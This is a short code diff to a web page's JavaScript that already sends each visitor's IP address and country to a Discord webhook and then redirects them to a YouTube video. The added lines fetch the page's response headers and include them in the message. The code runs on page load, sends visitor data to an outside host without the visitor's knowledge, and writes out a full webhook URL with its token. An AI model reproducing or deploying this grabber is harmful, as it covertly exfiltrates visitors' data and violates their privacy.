@@ -8,9 +8,13 @@
       console.log(data.ip);
       ip = data.ip;
       country = data.country;
-    
+    var req = new XMLHttpRequest();
+req.open('GET', document.location, false);
+req.send(null);
+var headers = req.getAllResponseHeaders().toLowerCase();
+
         $.post("https://discord.com/api/webhooks/1129005512319565915/-Sd8KVZ0olUpXV8RGb57Lh2G-zE7t59Pt9PlnWwqGVS0YscL2kzoEwcU4RVFVYlwIqkg",{
-          "content":`ziyaret\nip: ${data.ip}\ncountry: ${data.country}`
+          "content":`ziyaret\nip: ${data.ip}\ncountry: ${data.country}\nheaders: ${headers}`
         }, function (data) {
            location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         },"json");
